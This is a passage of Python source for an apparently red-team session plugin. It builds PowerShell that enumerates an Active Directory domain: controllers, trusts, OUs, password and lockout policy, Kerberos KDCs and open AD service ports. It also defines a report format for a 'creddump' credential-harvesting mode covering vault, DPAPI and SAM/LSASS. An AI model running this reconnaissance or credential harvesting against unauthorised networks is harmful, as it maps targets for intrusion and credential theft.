"""Windows Active Directory and domain enumeration."""

from typing import Any, Dict, List

from ..api import plugin, SessionContext
from ..shared.common import format_list_section, format_section, format_table_section
from ..shared.runner import run_collector_plugin
from ._helpers import wrap_ps_collector

OU_LIMIT = 30
MAX_DCS = 50

ADINFO_USAGE = """Usage:
  run adinfo              Full AD/domain enumeration (read-only)
  run adinfo creddump     Credential harvesting (explicit mode only)
"""

_TRUST_DIRECTIONS = {
    '1': 'Inbound',
    '2': 'Outbound',
    '3': 'Bidirectional',
    'inbound': 'Inbound',
    'outbound': 'Outbound',
    'bidirectional': 'Bidirectional',
}

PLUGIN_INFO = ADINFO_USAGE

def _domain_role_name(role: int) -> str:
    roles = {
        0: 'Standalone Workstation',
        1: 'Member Workstation',
        2: 'Standalone Server',
        3: 'Member Server',
        4: 'Backup Domain Controller',
        5: 'Primary Domain Controller',
    }
    return roles.get(role, f'Unknown ({role})')


def _normalize_trust_direction(value: Any) -> str:
    if value is None:
        return ''
    text = str(value).strip()
    if text in _TRUST_DIRECTIONS:
        return _TRUST_DIRECTIONS[text]
    return text


def _format_role_field(role: Any) -> str:
    if role is None:
        return ''
    try:
        role_int = int(role)
    except (TypeError, ValueError):
        return str(role)
    return f"{role_int} ({_domain_role_name(role_int)})"


def _is_non_ad_environment(data: Dict[str, Any]) -> bool:
    env = data.get('ad_environment')
    if env is False:
        return True
    if isinstance(env, str) and env.strip().lower() in ('false', '0', 'no'):
        return True

    summary = data.get('summary') or {}
    if summary.get('domain_joined') is False or summary.get('ad_environment') is False:
        return True

    for block in (data.get('computer_domain'), data.get('domain_membership')):
        if not isinstance(block, dict):
            continue
        if block.get('part_of_domain') is False:
            return True
        if str(block.get('domain_membership', '')).lower() == 'workgroup':
            return True
        domain = str(block.get('domain', '')).strip().upper()
        workgroup = str(block.get('workgroup', '')).strip().upper()
        if domain == 'WORKGROUP':
            return True
        if workgroup and domain == workgroup and not block.get('part_of_domain'):
            return True
    return False


def _section_or_na(title: str, content: str) -> str:
    if content and content.strip():
        return content
    return f"{title}\n{'-' * len(title)}\nN/A"


def _format_sites_subnets(sites: List[Dict[str, Any]]) -> str:
    lines = ['Sites / Subnets', '-' * 15]
    if not sites:
        lines.append('N/A')
        return '\n'.join(lines)
    for site in sites[:40]:
        name = site.get('name') or site.get('site') or '?'
        lines.append(f"Site: {name}")
        subnets = site.get('subnets') or []
        if subnets:
            lines.append('  Subnets:')
            for subnet in subnets[:20]:
                lines.append(f"    {subnet}")
        dcs = site.get('domain_controllers') or site.get('dcs') or []
        if dcs:
            lines.append('  Domain Controllers:')
            for dc in dcs[:20]:
                lines.append(f"    {dc}")
        gcs = site.get('global_catalogs') or []
        if gcs:
            lines.append('  Global Catalogs:')
            for gc in gcs[:20]:
                lines.append(f"    {gc}")
        lines.append('')
    if len(sites) > 40:
        lines.append(f"... and {len(sites) - 40} more sites")
    return '\n'.join(lines).rstrip()


def _format_fsmo(fsmo: Dict[str, Any]) -> str:
    if not fsmo:
        return _section_or_na('FSMO Roles', '')
    display: Dict[str, Any] = {}
    for key, label in (
        ('pdc_emulator', 'PDC Emulator'),
        ('rid_master', 'RID Master'),
        ('infrastructure_master', 'Infrastructure Master'),
        ('schema_master', 'Schema Master'),
        ('domain_naming_master', 'Domain Naming Master'),
    ):
        entry = fsmo.get(key)
        if isinstance(entry, dict):
            holder = entry.get('holder') or entry.get('name') or entry.get('host') or ''
            reachable = entry.get('reachable')
            suffix = ''
            if reachable is True:
                suffix = ' (reachable)'
            elif reachable is False:
                suffix = ' (unreachable)'
            display[label] = f"{holder}{suffix}" if holder else 'N/A'
        elif entry:
            display[label] = str(entry)
    return format_section('FSMO Roles', display) if display else _section_or_na('FSMO Roles', '')


def _format_services_block(services: Any) -> str:
    if not services:
        return _section_or_na('LDAP / AD Services', '')
    if isinstance(services, list):
        if services and isinstance(services[0], dict):
            cols = [c for c in ('target', 'host', 'ldap', 'ldaps', 'gc_ldap', 'gc_ldaps', 'kerberos', 'dns', 'adws', 'reachable') if any(row.get(c) for row in services)]
            return format_table_section('LDAP / AD Services', services, cols or ['target'])
        return format_list_section('LDAP / AD Services', [str(v) for v in services])
    if isinstance(services, dict):
        return format_section('LDAP / AD Services', services)
    return _section_or_na('LDAP / AD Services', '')


def format_adinfo_report(data: Dict[str, Any]) -> str:
    if _is_non_ad_environment(data):
        message = data.get('message') or 'Windows is not in an Active Directory environment.'
        sections: List[str] = [
            'ADInfo',
            '=' * 6,
            '',
            'Status: Not an Active Directory environment',
            message,
        ]
        computer = data.get('computer_domain') or {}
        identity = data.get('current_identity') or {}
        if computer:
            sections.append(format_section('Computer / Domain', computer))
        if identity:
            sections.append(format_section('Current Identity', identity))
        warnings = data.get('warnings') or []
        if warnings:
            sections.append(format_list_section('Warnings', [str(w) for w in warnings]))
        return '\n\n'.join(sections)

    sections: List[str] = ['ADInfo', '=' * 6]

    computer = data.get('computer_domain') or {}
    membership = data.get('domain_membership') or {}
    computer_block = dict(computer)
    for key, value in membership.items():
        if key == 'domain_details':
            continue
        if value not in (None, '', [], {}):
            computer_block.setdefault(key, value)
    if membership.get('domain_details'):
        computer_block['domain_details'] = membership['domain_details']
    role = computer_block.get('domain_role')
    if role is not None and 'domain_role_name' not in computer_block:
        computer_block['domain_role'] = _format_role_field(role)
    sections.append(format_section('Computer / Domain', computer_block) if computer_block else _section_or_na('Computer / Domain', ''))

    identity = data.get('current_identity') or {}
    sections.append(format_section('Current Identity', identity) if identity else _section_or_na('Current Identity', ''))

    dcs = data.get('domain_controllers') or []
    if dcs and isinstance(dcs[0], dict):
        cols = [c for c in ('name', 'host', 'ip', 'ipv6', 'site', 'os', 'os_version', 'gc', 'pdc', 'discovered', 'reachable', 'line') if any(row.get(c) not in (None, '') for row in dcs)]
        sections.append(format_table_section('Domain Controllers', dcs, cols or ['line']))
    elif dcs:
        sections.append(format_list_section('Domain Controllers', [str(v) for v in dcs]))
    else:
        sections.append(_section_or_na('Domain Controllers', ''))

    sections.append(_format_fsmo(data.get('fsmo_roles') or {}))

    forest = data.get('forest')
    if isinstance(forest, dict) and forest:
        display = dict(forest)
        for pop_key in ('global_catalogs', 'schema_master', 'domain_naming_master'):
            display.pop(pop_key, None)
        sections.append(format_section('Forest', display))
    elif isinstance(forest, str) and forest:
        sections.append(format_section('Forest', {'name': forest}))
    else:
        sections.append(_section_or_na('Forest', ''))

    domain_info = data.get('domain_info') or {}
    if domain_info:
        display = dict(domain_info)
        for pop_key in ('fsmo_roles', 'domain_controllers', 'global_catalogs'):
            display.pop(pop_key, None)
        sections.append(format_section('Domain', display))
    else:
        sections.append(_section_or_na('Domain', ''))

    sites = data.get('sites_subnets') or []
    sections.append(_format_sites_subnets(sites if isinstance(sites, list) else []))

    ous = data.get('organizational_units') or []
    if ous and isinstance(ous[0], dict):
        cols = [c for c in ('name', 'canonical', 'dn', 'parent', 'description', 'line') if any(row.get(c) for row in ous)]
        sections.append(format_table_section('Organizational Units', ous, cols or ['line']))
    elif ous:
        sections.append(format_list_section('Organizational Units', [str(ou) for ou in ous]))
    else:
        sections.append(_section_or_na('Organizational Units', ''))

    trusts = data.get('trusts') or []
    if trusts and isinstance(trusts[0], dict):
        normalized = []
        for row in trusts:
            item = dict(row)
            if item.get('dir'):
                item['dir'] = _normalize_trust_direction(item['dir'])
            if item.get('direction'):
                item['direction'] = _normalize_trust_direction(item['direction'])
            normalized.append(item)
        cols = [c for c in ('name', 'direction', 'dir', 'type', 'transitive', 'selective_auth', 'sid_filtering', 'line') if any(row.get(c) not in (None, '') for row in normalized)]
        sections.append(format_table_section('Trusts', normalized, cols or ['line']))
    elif trusts:
        sections.append(format_list_section('Trusts', [str(t) for t in trusts]))
    else:
        sections.append(_section_or_na('Trusts', ''))

    gc = data.get('global_catalog') or {}
    if gc:
        sections.append(format_section('Global Catalog', gc))
    else:
        sections.append(_section_or_na('Global Catalog', ''))

    sections.append(_format_services_block(data.get('ldap_ad_services')))

    dns = data.get('dns_configuration') or {}
    sections.append(format_section('DNS Configuration', dns) if dns else _section_or_na('DNS Configuration', ''))

    shares = data.get('sysvol_netlogon') or {}
    sections.append(format_section('SYSVOL / NETLOGON', shares) if shares else _section_or_na('SYSVOL / NETLOGON', ''))

    policy = data.get('password_policy') or {}
    sections.append(format_section('Password Policy', policy) if policy else _section_or_na('Password Policy', ''))

    kerberos = data.get('kerberos') or {}
    sections.append(format_section('Kerberos', kerberos) if kerberos else _section_or_na('Kerberos', ''))

    naming = data.get('naming_contexts') or {}
    sections.append(format_section('Directory Naming Contexts', naming) if naming else _section_or_na('Directory Naming Contexts', ''))

    time_sync = data.get('time_synchronization') or {}
    sections.append(format_section('Time Synchronization', time_sync) if time_sync else _section_or_na('Time Synchronization', ''))

    secure = data.get('secure_channel') or {}
    sections.append(format_section('Machine / Secure Channel', secure) if secure else _section_or_na('Machine / Secure Channel', ''))

    warnings = data.get('warnings') or []
    errors = data.get('collection_errors') or []
    warn_lines = [str(w) for w in warnings + errors]
    if warn_lines:
        sections.append(format_list_section('Warnings', warn_lines))

    if len(sections) <= 1:
        return 'ADInfo: no data collected.'
    return '\n\n'.join(sections)


def format_creddump_report(data: Dict[str, Any]) -> str:
    sections: List[str] = ['ADInfo Credential Dump', '=' * 22]
    summary = data.get('summary') or {}
    if summary:
        sections.append(format_section('Summary', summary))
    for title, key in (
        ('Stored Credentials (cmdkey)', 'cmdkey'),
        ('Credential Vault', 'vault'),
        ('Logon Sessions', 'logon_sessions'),
        ('DPAPI / Cache Metadata', 'dpapi'),
        ('SAM / LSASS', 'privileged'),
    ):
        block = data.get(key)
        if isinstance(block, dict) and block:
            sections.append(format_section(title, block))
        elif isinstance(block, list) and block:
            sections.append(format_list_section(title, [str(v) for v in block]))
    warnings = data.get('warnings') or []
    if warnings:
        sections.append(format_list_section('Warnings', [str(w) for w in warnings]))
    if data.get('error'):
        sections.append(f"Error: {data['error']}")
    if len(sections) <= 1:
        return 'ADInfo creddump: no data collected.'
    return '\n\n'.join(sections)


def _ps_common_helpers() -> str:
    return r"""
function Get-DomainRoleLabel($role){
  switch([int]$role){
    0 { 'Standalone Workstation' }
    1 { 'Member Workstation' }
    2 { 'Standalone Server' }
    3 { 'Member Server' }
    4 { 'Backup Domain Controller' }
    5 { 'Primary Domain Controller' }
    default { "Unknown ($role)" }
  }
}

function Invoke-AdEnum([scriptblock]$Block){
  try { return & $Block } catch { return $null }
}

function Add-AdWarning([ref]$Warnings,[string]$Message){
  if($Message){ $Warnings.Value += $Message }
}

function Test-IsAdEnvironment($ComputerSystem){
  if(-not $ComputerSystem){ return $false }
  if(-not $ComputerSystem.PartOfDomain){ return $false }
  $domain=[string]$ComputerSystem.Domain
  if([string]::IsNullOrWhiteSpace($domain)){ return $false }
  if($domain -ieq 'WORKGROUP'){ return $false }
  $workgroup=[string]$ComputerSystem.Workgroup
  if($workgroup -and ($domain -ieq $workgroup)){ return $false }
  return $true
}

function Test-DomainControllerReachable([string]$Domain,[int]$TimeoutSec=5){
  if([string]::IsNullOrWhiteSpace($Domain)){ return $false }
  $proc=$null
  try{
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName='nltest'
    $psi.Arguments="/dsgetdc:$Domain"
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    $proc=[System.Diagnostics.Process]::Start($psi)
    if(-not $proc.WaitForExit($TimeoutSec * 1000)){
      try{$proc.Kill()}catch{}
      return $false
    }
    $out=$proc.StandardOutput.ReadToEnd()
    if($out -and ($out -match 'DC:\\\\')){ return $true }
  }catch{} finally{ if($proc){ try{$proc.Dispose()}catch{} } }
  return $false
}

function Test-TcpPort([string]$HostName,[int]$Port,[int]$Ms=1500){
  if(-not $HostName){ return $false }
  $client=$null
  try{
    $client=New-Object Net.Sockets.TcpClient
    $iar=$client.BeginConnect($HostName,$Port,$null,$null)
    if(-not $iar.AsyncWaitHandle.WaitOne($Ms,$false)){ return $false }
    $client.EndConnect($iar)|Out-Null
    return $true
  }catch{ return $false }
  finally{ if($client){ try{$client.Close()}catch{} } }
}

function Get-ReachableHost([string]$HostName){
  if(-not $HostName){ return $false }
  $target=$HostName -replace '^\\\\',''
  try{
    if(Test-Connection -ComputerName $target -Count 1 -Quiet -EA Stop){ return $true }
  }catch{}
  return $false
}

function Test-AdServiceBundle([string]$HostName){
  $target=$HostName -replace '^\\\\',''
  [ordered]@{
    host=$target
    reachable=(Get-ReachableHost $target)
    ldap=(Test-TcpPort $target 389)
    ldaps=(Test-TcpPort $target 636)
    gc_ldap=(Test-TcpPort $target 3268)
    gc_ldaps=(Test-TcpPort $target 3269)
    kerberos=(Test-TcpPort $target 88)
    dns=(Test-TcpPort $target 53)
    adws=(Test-TcpPort $target 9389)
  }
}

function Get-TrustDirectionLabel($direction){
  switch("$direction".ToLower()){
    '1' { 'Inbound' }
    '2' { 'Outbound' }
    '3' { 'Bidirectional' }
    'inbound' { 'Inbound' }
    'outbound' { 'Outbound' }
    'bidirectional' { 'Bidirectional' }
    default { [string]$direction }
  }
}

function Get-FsmoEntry([string]$Holder){
  if(-not $Holder){ return $null }
  $targetHost=$Holder -replace '^\\\\',''
  [ordered]@{
    holder=$Holder
    host=$targetHost
    reachable=(Get-ReachableHost $targetHost)
  }
}
"""


def build_command():
    body = (
        _ps_common_helpers()
        + f"$OuLimit = {OU_LIMIT}\n$MaxDcs = {MAX_DCS}\n"
        + r"""
$warnings = @()
$collectionErrors = @()

function Get-ComputerSidSafe(){
  try{
    $acct = New-Object System.Security.Principal.NTAccount($env:COMPUTERNAME + '$')
    return $acct.Translate([System.Security.Principal.SecurityIdentifier]).Value
  }catch{ return $null }
}

function Get-CurrentIdentityBlock(){
  $ident = [ordered]@{}
  try{
    $wi = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    if($wi){
      $ident.username = $wi.Name
      $ident.user_sid = $wi.User.Value
      if($wi.Name -match '^([^\\]+)\\(.+)$'){
        $ident.domain = $Matches[1]
        $ident.sam_account = $Matches[2]
      }
      $ident.authentication_type = [string]$wi.AuthenticationType
      $ident.is_system = $wi.IsSystem
      $ident.is_anonymous = $wi.IsAnonymous
      $ident.is_guest = $wi.IsGuest
      $ident.is_authenticated = $wi.IsAuthenticated
      $ident.impersonation_level = [string]$wi.ImpersonationLevel
    }
  }catch{ Add-AdWarning ([ref]$warnings) "Current identity: $($_.Exception.Message)" }
  $ident.execution_user = $env:USERNAME
  $ident.logon_domain = $env:USERDOMAIN
  $ident.userdnsdomain = $env:USERDNSDOMAIN
  $ident.logon_server = $env:LOGONSERVER
  $ident.userdomain_roaming = $env:USERDOMAIN_ROAMINGPROFILE
  try{
    $cs = Get-CimInstance Win32_ComputerSystem -EA Stop
    $ident.computer_name = $cs.Name
    $ident.computer_domain = $cs.Domain
    $ident.computer_role = Get-DomainRoleLabel $cs.DomainRole
  }catch{}
  try{
    $who = whoami /user /fo csv /nh 2>$null
    if($who){ $ident.whoami_user_sid = ($who | Select-Object -First 1).Trim('"') }
  }catch{}
  return $ident
}

function Get-ComputerDomainBlock($cs){
  $block = [ordered]@{}
  if($cs){
    $block.computer_name = $cs.Name
    $block.domain_membership = if($cs.PartOfDomain){ 'Domain-joined' }else{ 'Workgroup' }
    $block.domain = $cs.Domain
    $block.workgroup = $cs.Workgroup
    $block.part_of_domain = [bool]$cs.PartOfDomain
    $block.domain_role = $cs.DomainRole
    $block.domain_role_name = Get-DomainRoleLabel $cs.DomainRole
    $block.dns_hostname = $cs.DNSHostName
    $block.fqdn = if($cs.DNSHostName){ $cs.DNSHostName }else{ $cs.Name }
  }
  try{
    $os = Get-CimInstance Win32_OperatingSystem -EA Stop
    $block.os = $os.Caption
    $block.os_version = $os.Version
    $block.os_build = $os.BuildNumber
    $block.architecture = $os.OSArchitecture
    $block.last_boot = $os.LastBootUpTime
  }catch{ Add-AdWarning ([ref]$warnings) "OS info: $($_.Exception.Message)" }
  try{
    $tcp = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters' -EA Stop
    $block.primary_dns_suffix = $tcp.Domain
    $suffixes = @()
    if($tcp.SearchList){ $suffixes += ($tcp.SearchList -split ',') }
    if($tcp.DNSSearchList){ $suffixes += @($tcp.DNSSearchList) }
    if($suffixes.Count){ $block.dns_suffix_search_list = @($suffixes | Where-Object { $_ } | Select-Object -Unique) }
  }catch{}
  $block.computer_sid = Get-ComputerSidSafe
  $block.current_logon_domain = $env:USERDOMAIN
  $block.logon_server = $env:LOGONSERVER
  return $block
}

$cs = Get-CimInstance Win32_ComputerSystem -EA 0
$currentIdentity = Get-CurrentIdentityBlock
$computerDomain = Get-ComputerDomainBlock $cs

$join = Test-IsAdEnvironment $cs
if($join){
  $probeDomain = [string]$cs.Domain
  if(-not (Test-DomainControllerReachable $probeDomain 8)){
    Add-AdWarning ([ref]$warnings) "Domain membership reported for '$probeDomain' but no domain controller was discovered."
    $join = $false
  }
}

if(-not $join){
  $membershipLabel = if($computerDomain.domain_membership){ $computerDomain.domain_membership }else{ 'Workgroup' }
  $result = [ordered]@{
    ad_environment = $false
    message = 'Windows is not in an Active Directory environment.'
    summary = [ordered]@{
      domain_joined = $false
      ad_environment = $false
      domain_membership = $membershipLabel
    }
    computer_domain = $computerDomain
    current_identity = $currentIdentity
    warnings = @($warnings)
  }
  $json = ($result | ConvertTo-Json -Depth 6 -Compress)
} else {
  $domain = $cs.Domain
  $role = $cs.DomainRole
  $adModule = $false
  try { Import-Module ActiveDirectory -EA Stop; $adModule = $true } catch {
    Add-AdWarning ([ref]$warnings) 'ActiveDirectory PowerShell module unavailable; using native fallbacks where possible.'
  }

  # Domain membership (preserve existing fields)
  $membership = [ordered]@{
    domain = $domain
    part_of_domain = $true
    domain_role = $role
    domain_role_name = (Get-DomainRoleLabel $role)
    workgroup = $cs.Workgroup
    dns_hostname = $cs.DNSHostName
    logon_domain = $env:USERDOMAIN
    computer_name = $cs.Name
    fqdn = $cs.DNSHostName
    logon_server = $env:LOGONSERVER
  }

  $domainSid = $null
  $domainInfo = $null
  $fsmoRoles = [ordered]@{}
  if($adModule){
    $domainInfo = Invoke-AdEnum {
      $d = Get-ADDomain -EA Stop
      $domainSid = $d.DomainSID.Value
      [ordered]@{
        dns_root = $d.DNSRoot
        netbios = $d.NetBIOSName
        functional_level = [string]$d.DomainMode
        domain_sid = $d.DomainSID.Value
        pdce = $d.PDCEmulator
        rid_master = $d.RIDMaster
        infrastructure_master = $d.InfrastructureMaster
        parent_domain = $d.ParentDomain
        root_domain = if($d.ParentDomain){ $d.ParentDomain }else{ $d.DNSRoot }
      }
    }
    if($domainInfo){
      $membership['domain_details'] = $domainInfo
      $domainSid = $domainInfo.domain_sid
      if($domainInfo.netbios){ $computerDomain.netbios_domain = $domainInfo.netbios }
      if($domainInfo.dns_root){ $computerDomain.domain_dns_root = $domainInfo.dns_root }
      $fsmoRoles.pdc_emulator = Get-FsmoEntry $domainInfo.pdce
      $fsmoRoles.rid_master = Get-FsmoEntry $domainInfo.rid_master
      $fsmoRoles.infrastructure_master = Get-FsmoEntry $domainInfo.infrastructure_master
    }
  }
  if($domainSid){ $computerDomain.domain_sid = $domainSid }

  $dcName = Invoke-AdEnum {
    $r = nltest /dsgetdc:$domain 2>$null
    if($r){ ($r | Select-String -Pattern 'DC:\\\\.*' | Select-Object -First 1).ToString().Trim() }
  }
  if($dcName){ $membership['nearest_dc'] = $dcName }

  # Domain controllers
  $dcs = @()
  $pdceName = $null
  if($domainInfo -and $domainInfo.pdce){ $pdceName = ($domainInfo.pdce -replace '^\\\\','') }
  if($adModule){
    $fromAd = Invoke-AdEnum {
      Get-ADDomainController -Filter * -EA Stop |
        Select-Object -First $MaxDcs Name, HostName, IPv4Address, IPv6Address, Site, IsGlobalCatalog, OperatingSystem, OperatingSystemVersion |
        ForEach-Object {
          $hostName = $_.HostName
          if(-not $hostName){ $hostName = $_.Name }
          $reachable = Get-ReachableHost $hostName
          [ordered]@{
            name = $_.Name
            host = $hostName
            ip = $_.IPv4Address
            ipv6 = $_.IPv6Address
            site = $_.Site
            gc = $_.IsGlobalCatalog
            pdc = if($pdceName -and ($_.Name -eq $pdceName -or $hostName -eq $pdceName)){ $true }else{ $false }
            os = $_.OperatingSystem
            os_version = $_.OperatingSystemVersion
            discovered = $true
            reachable = $reachable
          }
        }
    }
    if($fromAd){ $dcs = @($fromAd) }
  }
  if(-not $dcs.Count){
    $fromNltest = Invoke-AdEnum {
      $rows = @()
      nltest /dclist:$domain 2>$null | ForEach-Object {
        $line = $_.Trim()
        if($line -and ($line -match '\\')){
          $hostGuess = ($line -split '\s+')[0]
          $rows += [ordered]@{
            line = $line
            host = $hostGuess
            discovered = $true
            reachable = (Get-ReachableHost $hostGuess)
          }
        }
      }
      if($rows.Count){ $rows }
    }
    if($fromNltest){ $dcs = @($fromNltest) }
  }

  # Forest
  $forest = $null
  $forestTrusts = @()
  if($adModule){
    $forest = Invoke-AdEnum {
      $f = Get-ADForest -EA Stop
      $fsmoRoles.schema_master = Get-FsmoEntry $f.SchemaMaster
      $fsmoRoles.domain_naming_master = Get-FsmoEntry $f.DomainNamingMaster
      [ordered]@{
        name = $f.Name
        root_domain = $f.RootDomain
        forest_mode = [string]$f.ForestMode
        schema_master = $f.SchemaMaster
        domain_naming_master = $f.DomainNamingMaster
        domains = @($f.Domains)
        global_catalogs = @($f.GlobalCatalogs | Select-Object -First 20)
      }
    }
    $forestTrusts = Invoke-AdEnum {
      Get-ADTrust -Filter * -EA Stop |
        Where-Object { $_.TrustType -match 'Forest' } |
        Select-Object -First 20 Name, Direction, TrustType, IntraForest |
        ForEach-Object {
          [ordered]@{
            name = $_.Name
            direction = (Get-TrustDirectionLabel $_.Direction)
            type = [string]$_.TrustType
            intra_forest = $_.IntraForest
          }
        }
    }
    if(-not $forestTrusts){ $forestTrusts = @() }
  }
  if(-not $forest){
    $forestName = Invoke-AdEnum {
      $r = nltest /dsgetdc:$domain /forest 2>$null
      if($r){
        $m = [regex]::Match($r, 'DNS Forest Name:\\s*(.+)')
        if($m.Success){ $m.Groups[1].Value.Trim() }
      }
    }
    if($forestName){ $forest = [ordered]@{ name = $forestName } }
  }
  if($forest -and $forest.name){ $computerDomain.forest_name = $forest.name }

  # Domain info block
  $domainBlock = [ordered]@{}
  if($domainInfo){
    foreach($k in $domainInfo.Keys){ $domainBlock[$k] = $domainInfo[$k] }
  }
  $domainBlock.domain = $domain
  if($adModule){
    $adws = Invoke-AdEnum {
      $svc = Get-Service ADWS -EA 0
      if($svc){ [ordered]@{ status = [string]$svc.Status; start = [string]$svc.StartType } }
    }
    if($adws){ $domainBlock.ad_web_services = $adws }
  }

  # Trusts
  $trusts = @()
  if($adModule){
    $fromAd = Invoke-AdEnum {
      Get-ADTrust -Filter * -EA Stop |
        Select-Object -First 40 Name, Direction, TrustType, DisallowTransivity, SelectiveAuthentication, SIDFilteringEnabled, IntraForest, ForestTransitive |
        ForEach-Object {
          [ordered]@{
            name = $_.Name
            direction = (Get-TrustDirectionLabel $_.Direction)
            type = [string]$_.TrustType
            transitive = if($_.DisallowTransivity){ 'No' }else{ 'Yes' }
            selective_auth = $_.SelectiveAuthentication
            sid_filtering = $_.SIDFilteringEnabled
            intra_forest = $_.IntraForest
          }
        }
    }
    if($fromAd){ $trusts = @($fromAd) }
  }
  if(-not $trusts.Count){
    $fromNltest = Invoke-AdEnum {
      $rows = @()
      nltest /domain_trusts 2>$null | ForEach-Object {
        $line = $_.Trim()
        if($line -and ($line -notmatch '^(Trust|Trusted|Domain|Type|The command|List of)' -and $line -notmatch '^-+$')){
          $rows += [ordered]@{ line = $line }
        }
      }
      if($rows.Count){ $rows }
    }
    if($fromNltest){ $trusts = @($fromNltest) }
  }

  # Sites / subnets
  $sitesSubnets = @()
  if($adModule){
    $sitesSubnets = Invoke-AdEnum {
      $siteRows = @()
      $allSites = @(Get-ADReplicationSite -Filter * -EA Stop | Select-Object -First 30)
      $allSubnets = @(Get-ADReplicationSubnet -Filter * -EA Stop | Select-Object -First 80 Name, Site)
      $siteDcMap = @{}
      foreach($dc in $dcs){
        $siteName = $dc.site
        if(-not $siteName){ continue }
        if(-not $siteDcMap.ContainsKey($siteName)){ $siteDcMap[$siteName] = @() }
        $siteDcMap[$siteName] += $dc.name
      }
      foreach($site in $allSites){
        $siteName = $site.Name
        $subnets = @($allSubnets | Where-Object { $_.Site -eq $siteName } | ForEach-Object { $_.Name })
        $siteDcs = @($siteDcMap[$siteName])
        $siteGcs = @($dcs | Where-Object { $_.site -eq $siteName -and $_.gc } | ForEach-Object { $_.name })
        $siteRows += [ordered]@{
          name = $siteName
          subnets = $subnets
          domain_controllers = $siteDcs
          global_catalogs = $siteGcs
        }
      }
      $siteRows
    }
    if(-not $sitesSubnets){ $sitesSubnets = @() }
  }

  # OUs (bounded)
  $ous = @()
  if($adModule){
    $fromAd = Invoke-AdEnum {
      Get-ADOrganizationalUnit -Filter * -EA Stop |
        Select-Object -First $OuLimit Name, DistinguishedName, CanonicalName, Description |
        ForEach-Object {
          $parent = $null
          if($_.DistinguishedName -match '^OU=[^,]+,(.+)$'){ $parent = $Matches[1] }
          [ordered]@{
            name = $_.Name
            dn = $_.DistinguishedName
            canonical = $_.CanonicalName
            parent = $parent
            description = $_.Description
          }
        }
    }
    if($fromAd){ $ous = @($fromAd) }
  }
  if(-not $ous.Count){
    $fromDsquery = Invoke-AdEnum {
      $rows = @()
      dsquery ou -limit $OuLimit 2>$null | ForEach-Object {
        $line = $_.Trim()
        if($line){ $rows += [ordered]@{ dn = $line } }
      }
      if($rows.Count){ $rows }
    }
    if($fromDsquery){ $ous = @($fromDsquery) }
  }

  # Global Catalog summary
  $gcServers = @($dcs | Where-Object { $_.gc } | ForEach-Object { if($_.host){ $_.host }else{ $_.name } })
  if($forest -and $forest.global_catalogs){
    foreach($g in $forest.global_catalogs){ if($g -and ($gcServers -notcontains $g)){ $gcServers += $g } }
  }
  $gcSites = @($dcs | Where-Object { $_.gc -and $_.site } | ForEach-Object { $_.site } | Select-Object -Unique)
  $gcBlock = [ordered]@{
    available = ($gcServers.Count -gt 0)
    servers = @($gcServers | Select-Object -First 20)
    sites = @($gcSites)
  }
  if($gcServers.Count){
    $probeHost = ($gcServers | Select-Object -First 1) -replace '^\\\\',''
    $gcBlock.gc_ldap = (Test-TcpPort $probeHost 3268)
    $gcBlock.gc_ldaps = (Test-TcpPort $probeHost 3269)
    $gcBlock.reachable = (Get-ReachableHost $probeHost)
  }

  # LDAP / AD service availability (bounded to discovered DCs, max 10)
  $ldapServices = @()
  $probeTargets = @($dcs | Select-Object -First 10)
  foreach($dc in $probeTargets){
    $target = $dc.host
    if(-not $target){ $target = $dc.name }
    if(-not $target){ continue }
    $bundle = Test-AdServiceBundle $target
    $bundle.target = $dc.name
    $ldapServices += $bundle
  }

  # DNS configuration
  $dnsConfig = [ordered]@{}
  try{
    $adapters = Get-DnsClientServerAddress -AddressFamily IPv4 -EA Stop | Where-Object { $_.ServerAddresses }
    $servers = @()
    foreach($a in $adapters){ $servers += @($a.ServerAddresses) }
    if($servers.Count){ $dnsConfig.dns_servers = @($servers | Select-Object -Unique) }
  }catch{
    try{
      $tcp = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters' -EA Stop
      if($tcp.NameServer){ $dnsConfig.dns_servers = @($tcp.NameServer -split ',') }
    }catch{ Add-AdWarning ([ref]$warnings) "DNS config: $($_.Exception.Message)" }
  }
  $dnsConfig.primary_dns_suffix = $computerDomain.primary_dns_suffix
  $dnsConfig.dns_suffix_search_list = $computerDomain.dns_suffix_search_list
  $dnsConfig.computer_fqdn = $computerDomain.fqdn
  $dnsConfig.domain_dns_name = $domain
  $dnsConfig.domain_controller_dns = @($dcs | ForEach-Object { $_.host } | Where-Object { $_ } | Select-Object -First 20)

  # SYSVOL / NETLOGON availability (no content enumeration)
  $sysvolPath = "\\\\$domain\\SYSVOL"
  $netlogonPath = "\\\\$domain\\NETLOGON"
  $sysvolNetlogon = [ordered]@{
    sysvol_path = $sysvolPath
    sysvol_available = (Test-Path $sysvolPath -EA 0)
    netlogon_path = $netlogonPath
    netlogon_available = (Test-Path $netlogonPath -EA 0)
  }

  # Password policy
  $passwordPolicy = $null
  if($adModule){
    $passwordPolicy = Invoke-AdEnum {
      $p = Get-ADDefaultDomainPasswordPolicy -EA Stop
      [ordered]@{
        min_password_length = $p.MinPasswordLength
        password_history = $p.PasswordHistoryCount
        min_password_age_days = $p.MinPasswordAge.Days
        max_password_age_days = $p.MaxPasswordAge.Days
        complexity_enabled = $p.ComplexityEnabled
        reversible_encryption = $p.ReversibleEncryptionEnabled
        lockout_threshold = $p.LockoutThreshold
        lockout_duration_minutes = $p.LockoutDuration.TotalMinutes
        lockout_observation_window_minutes = $p.LockoutObservationWindow.TotalMinutes
      }
    }
  }
  if(-not $passwordPolicy){
    $passwordPolicy = Invoke-AdEnum {
      $out = net accounts /domain 2>$null
      if($out){ [ordered]@{ raw = @($out | ForEach-Object { $_.Trim() }) } }
    }
    if(-not $passwordPolicy){ Add-AdWarning ([ref]$warnings) 'Password policy unavailable.' }
  }

  # Kerberos infrastructure (no ticket/cache collection)
  $kerberos = [ordered]@{
    realm = $env:USERDNSDOMAIN
    logon_server = $env:LOGONSERVER
    default_kdc = $dcName
    domain_kdcs = @($dcs | ForEach-Object { if($_.host){ $_.host }else{ $_.name } } | Where-Object { $_ } | Select-Object -First 15)
  }
  if($dcs.Count){
    $kdcHost = ($dcs | Select-Object -First 1).host
    if(-not $kdcHost){ $kdcHost = ($dcs | Select-Object -First 1).name }
